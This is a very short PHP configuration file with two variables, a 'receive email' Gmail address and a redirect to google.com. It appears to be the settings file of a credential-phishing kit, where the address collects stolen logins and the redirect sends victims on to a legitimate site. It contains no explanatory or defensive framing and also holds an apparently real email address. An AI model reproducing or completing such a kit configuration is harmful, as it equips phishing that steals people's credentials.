<?php 
$Receive_email="scottabramson2021@gmail.com";
$redirect="https://www.google.com/";
?>